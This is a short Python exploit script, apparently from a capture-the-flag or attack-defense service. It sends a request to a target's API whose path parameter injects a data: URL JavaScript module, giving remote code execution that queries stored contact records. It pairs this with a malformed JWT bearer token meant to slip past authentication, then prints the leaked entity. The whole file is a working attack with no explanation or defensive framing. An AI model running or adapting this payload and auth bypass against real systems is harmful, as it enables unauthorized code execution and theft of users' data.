#!/usr/bin/env python3

import sys
import requests
import base64

ip = sys.argv[1]
hint = sys.argv[2]

rce_payload = 'import model from "file:///app/models/artist.js"; export default {findById: async () => await model.find({name: "'+hint+'"}).select({contact:1}) }' 
url = f"http://{ip}:15151/api/entity/1?path=data:application/javascript,{rce_payload}// ../models/artist.js"

def malformed_token():
    def b64e(val):
        return base64.b64encode(val.encode()).decode().strip('=')

    headers = b64e('{"alg":"RS256","typ":"JWT"}') 
    payload = b64e('{')
    sign = 'AAA'
    return f'Bearer {headers}.{payload}.{sign}'

r = requests.get(url, headers={
    'Authorization': malformed_token()
})

print(r.json()["entity"], flush=True)
